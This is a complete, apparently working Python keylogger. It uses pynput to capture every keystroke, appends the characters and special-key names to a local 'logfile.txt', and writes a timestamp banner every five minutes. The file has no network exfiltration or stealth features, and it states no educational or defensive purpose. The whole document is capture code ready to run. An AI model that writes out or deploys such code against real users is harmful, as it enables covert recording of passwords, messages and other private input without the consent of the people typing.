from pynput import keyboard
import time
from threading import Timer


def write2file(text):

    with open("logfile.txt",'a') as file:
        if text == "[Key.space]":
             file.write(" ")
        elif text == "[Key.enter]":
             file.write(f"{text}\n")
        else :
            file.write(text)

def time_stamp():
    
    write2file(f"\n\n##################### {time.asctime()} #####################\n\n")
    timer=Timer(300,time_stamp)
    timer.start()

def key_pressed(key):
    
    try:         
            if hasattr(key,'char') :
                 write2file(key.char)
            else:
                write2file(f"[{key}]")

    except Exception as error:
        print(f"Error logging key : {key}")

   

write2file(f"\n\n##################### Key Logging Started : {time.asctime()} ##################### \n\n")
    
keyboard_listener= keyboard.Listener(on_press=key_pressed)
keyboard_listener.start()

timer = Timer(300,time_stamp)
timer.start()

keyboard_listener.join()

